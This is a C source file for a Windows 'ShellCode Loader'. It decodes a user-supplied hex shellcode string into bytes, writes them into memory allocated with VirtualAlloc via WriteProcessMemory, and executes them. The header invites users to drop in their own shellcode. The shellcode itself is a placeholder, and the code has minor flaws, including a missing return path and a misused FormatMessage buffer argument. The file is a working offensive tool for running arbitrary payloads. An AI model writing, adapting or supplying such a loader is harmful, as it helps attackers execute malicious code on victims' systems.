/*
* 
* Author: Bruno Braga
* ShellCode Loader 
* Usage: Modify the shellCodeString to your needs.
* Requirements: For Windows and tested on Windows 7
*
*
*
*
*/


#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
 

char* shellCodeString = "[SHELL_CODE_STRING]\0";

unsigned short convertCharToAscii(char character){

	char lowered = 0;

	if (isdigit(character))
		return character - 48;
	else if (isalpha(character)){
		lowered = tolower(character);
		return lowered - 87;
		
	}

}


int main(int argc, char **argv){
	
	int shellCodeStringSize = strlen(shellCodeString);
	int numberOfShellCodeBytes = shellCodeStringSize/2;
	unsigned char* shellCodeBytes = (char*) malloc(numberOfShellCodeBytes + 1); 
	int errorId = 0;
	char* errorMessage = NULL;
	void* shellcodeMemory = 0; 	
	int wmResult = 0;
	int shellCodeStringIndex = 0;
	int shellCodeBytesIndex = 0;

	for (shellCodeStringIndex = 0 ,shellCodeBytesIndex = 0; shellCodeStringIndex < shellCodeStringSize; shellCodeStringIndex+=2, shellCodeBytesIndex++){
		unsigned short highOrderHexDigit= convertCharToAscii(shellCodeString[shellCodeStringIndex]) << 0x4;
		unsigned short lowOrderHexDigit = convertCharToAscii(shellCodeString[shellCodeStringIndex + 1]);
		shellCodeBytes[shellCodeBytesIndex] = highOrderHexDigit + lowOrderHexDigit;
	}


	shellCodeBytes[shellCodeBytesIndex] = '\0';


	shellcodeMemory = VirtualAlloc(NULL, numberOfShellCodeBytes,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READ);
	if (((int) shellcodeMemory) == 0){
		errorId = GetLastError();
		FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM|FORMAT_MESSAGE_ALLOCATE_BUFFER,NULL,errorId,0,errorMessage,0,NULL);
		fprintf(stderr,"Failed to allocate memory:%s", errorMessage);
		return 1;
	}


	
	wmResult = WriteProcessMemory(GetCurrentProcess(),shellcodeMemory,shellCodeBytes,numberOfShellCodeBytes,NULL);

	if (wmResult == 0){
		errorId = GetLastError();
		FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM|FORMAT_MESSAGE_ALLOCATE_BUFFER,NULL,errorId,0,errorMessage,0,NULL);
		fprintf(stderr,"Failed to write shellcode to allocated memory:%s", errorMessage);
		return 1;
	}

	((void (*)(void))shellcodeMemory)();
	
}
